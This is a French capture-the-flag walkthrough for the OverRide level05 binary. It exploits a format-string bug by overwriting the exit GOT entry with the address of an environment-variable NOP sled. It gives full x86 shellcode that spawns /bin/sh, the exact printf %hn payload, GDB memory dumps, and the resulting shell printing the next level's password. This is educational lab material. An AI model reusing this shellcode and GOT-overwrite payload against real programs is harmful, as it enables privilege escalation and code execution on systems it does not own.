# level05: FORMAT STRING TO GOT

### Première étape — tester le programme

```bash
level05@OverRide:~$ ./level05 
TEST
test
---
level05@OverRide:~$ ./level05
AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
aaaa0x64.0xf7fcfac0.0xf7ec3add.0xffffd6ef.0xffffd6ee.(nil).0xffffffff.0xffffd774.0xf7fdb000.0x61616161
---
level05@OverRide:~$ ./level05
AAAA%10$p
aaaa0x61616161
```

Ok nous avons quelque chose d'interressant ! Tous notre input donner au programme passe par un ``tolower`` et nous avons aussi un format string detecter avec comme offset au 10 parametres de printf.

```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level05
```

---
### Ouvrir GDB

<details>

<summary> Voir le code nasm </summary>

```s
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	push   %edi
   0x08048448 <+4>:	push   %ebx
   0x08048449 <+5>:	and    $0xfffffff0,%esp
   0x0804844c <+8>:	sub    $0x90,%esp
   0x08048452 <+14>:	movl   $0x0,0x8c(%esp)
   0x0804845d <+25>:	mov    0x80497f0,%eax
   0x08048462 <+30>:	mov    %eax,0x8(%esp)
   0x08048466 <+34>:	movl   $0x64,0x4(%esp)
   0x0804846e <+42>:	lea    0x28(%esp),%eax
   0x08048472 <+46>:	mov    %eax,(%esp)
   0x08048475 <+49>:	call   0x8048350 <fgets@plt>
   0x0804847a <+54>:	movl   $0x0,0x8c(%esp)
   0x08048485 <+65>:	jmp    0x80484d3 <main+143>
   0x08048487 <+67>:	lea    0x28(%esp),%eax
   0x0804848b <+71>:	add    0x8c(%esp),%eax
   0x08048492 <+78>:	movzbl (%eax),%eax
   0x08048495 <+81>:	cmp    $0x40,%al
   0x08048497 <+83>:	jle    0x80484cb <main+135>
   0x08048499 <+85>:	lea    0x28(%esp),%eax
   0x0804849d <+89>:	add    0x8c(%esp),%eax
   0x080484a4 <+96>:	movzbl (%eax),%eax
   0x080484a7 <+99>:	cmp    $0x5a,%al
   0x080484a9 <+101>:	jg     0x80484cb <main+135>
   0x080484ab <+103>:	lea    0x28(%esp),%eax
   0x080484af <+107>:	add    0x8c(%esp),%eax
   0x080484b6 <+114>:	movzbl (%eax),%eax
   0x080484b9 <+117>:	mov    %eax,%edx
   0x080484bb <+119>:	xor    $0x20,%edx
   0x080484be <+122>:	lea    0x28(%esp),%eax
   0x080484c2 <+126>:	add    0x8c(%esp),%eax
   0x080484c9 <+133>:	mov    %dl,(%eax)
   0x080484cb <+135>:	addl   $0x1,0x8c(%esp)
   0x080484d3 <+143>:	mov    0x8c(%esp),%ebx
   0x080484da <+150>:	lea    0x28(%esp),%eax
   0x080484de <+154>:	movl   $0xffffffff,0x1c(%esp)
   0x080484e6 <+162>:	mov    %eax,%edx
   0x080484e8 <+164>:	mov    $0x0,%eax
   0x080484ed <+169>:	mov    0x1c(%esp),%ecx
   0x080484f1 <+173>:	mov    %edx,%edi
   0x080484f3 <+175>:	repnz scas %es:(%edi),%al
   0x080484f5 <+177>:	mov    %ecx,%eax
   0x080484f7 <+179>:	not    %eax
   0x080484f9 <+181>:	sub    $0x1,%eax
   0x080484fc <+184>:	cmp    %eax,%ebx
   0x080484fe <+186>:	jb     0x8048487 <main+67>
   0x08048500 <+188>:	lea    0x28(%esp),%eax
   0x08048504 <+192>:	mov    %eax,(%esp)
   0x08048507 <+195>:	call   0x8048340 <printf@plt>
   0x0804850c <+200>:	movl   $0x0,(%esp)
   0x08048513 <+207>:	call   0x8048370 <exit@plt>

```
</details>

> _**REMARQUE:**_ Nous pouvons voir la fonction `gets` qui est utiliser par les childs du programme !

---
### ASEMBLY TO C

*Clique [**ICI**](./Ressources/main.c) si tu veux voir tous le code en **C***

---
### FORMAT STRING + GOT + NOPSLEED

##### export payload

Nous preparons notre **NOPSLEED** dans l'env.

```bash
level05@OverRide:~$ export payload=$(python -c 'print b"\x90"*1000 + b"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')
```
AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
##### Trouver l'adresse de exit

Nous avons besoins de l'adresse de exit dans le GOT pour pouvoir reecrire par dessus et le remplacer par un ret.

```bash
level05@OverRide:~$ objdump -R ./level05 

./level05:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
080497c4 R_386_GLOB_DAT    __gmon_start__
080497f0 R_386_COPY        stdin
080497d4 R_386_JUMP_SLOT   printf
080497d8 R_386_JUMP_SLOT   fgets
080497dc R_386_JUMP_SLOT   __gmon_start__
080497e0 R_386_JUMP_SLOT   exit <-------------------
080497e4 R_386_JUMP_SLOT   __libc_start_main
```


##### Prendre une adresse du sleed

```bash
x/200xs environ
...........
0xffffda5d:	 "payload=\220\220\220\220
...........
(gdb) x/200gx 0xffffda5d
...........
0xffffdb0d:	0x9090909090909090	0x9090909090909090
0xffffdb1d:	0x9090909090909090	0x9090909090909090
0xffffdb2d:	0x9090909090909090	0x9090909090909090
0xffffdb3d:	0x9090909090909090	0x9090909090909090
0xffffdb4d:	0x9090909090909090	0x9090909090909090
0xffffdb5d:	0x9090909090909090	0x9090909090909090
0xffffdb6d:	0x9090909090909090	0x9090909090909090 
0xffffdb7d:	0x9090909090909090	0x9090909090909090
0xffffdb8d:	0x9090909090909090	0x9090909090909090
0xffffdb9d:	0x9090909090909090	0x9090909090909090
0xffffdbad:	0x9090909090909090	0x9090909090909090
0xffffdbbd:	0x9090909090909090	0x9090909090909090
...........
```
Prenons l'adresse ``0xffffdb6d`` par exemple.

##### Ecrire `0xffffdb6d` dans `0x080497e0`

La valeur de `0xffffdb6d` en decimal est egal a 4 294 957 933 ce nombre est beaucoup trop gros pour l'ecrire avec seulement $n de printf dans l'adresse target `0x080497e0`d(134518752)


_**TL;DR - Limites par type**_
Format	| Type écrit |	Taille  |	Valeur max               |	Valeur min                    |
|:-------|:----------:|:-------:|:--------------------------:|:------------------------------|
|%n	   |int         |4 bytes  | 0x7FFFFFFF (2 147 483 647) |	-0x80000000 (-2 147 483 648)  |
%hn	   |short       |2 bytes  | 0xFFFF (65 535)            |	0x0000 (0)                    |
%hhn	   |char	       |1 byte   |0xFF (255)	                |   0x00 (0)                    |

> **_REMARQUES_**: 0xffffdb6d est effectivement plus grand que int_max

##### Decouper et Reconstruire une adresse en 2 bytes.

Nous allons devoir decouper l'adresse target en 2 `[0x080497e0]` et ecrire `[0xffffdb6d]`

###### target
- LOW 080497e0
- HIGH 080497e0 + 2 = 080497e2

###### nopsled
- ffff = 65535
- dbf6 = 56173

- LOW :  db6d = 56173 - 8 = 56165
- HIGH : ffff = 65535 - 56173 = 9362
> **_REMARQUES_**: En calculant high ne pas rajouter a la soustraction le `-8` du LOW !
---
### PAYLOAD

```bash
(python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%56165d%10$hn" + "%9362d%11$hn"'; cat) | ./level05
```
---
### EXEC

```bash
level05@OverRide:~$ (python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%56165d%10$hn" + "%9362d%11$hn"'; cat) | ./level05
************
                                     -134415680
$ whoami
level06
$ cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq

```

**CONGRATULATIONS — you owned it ! 🎉**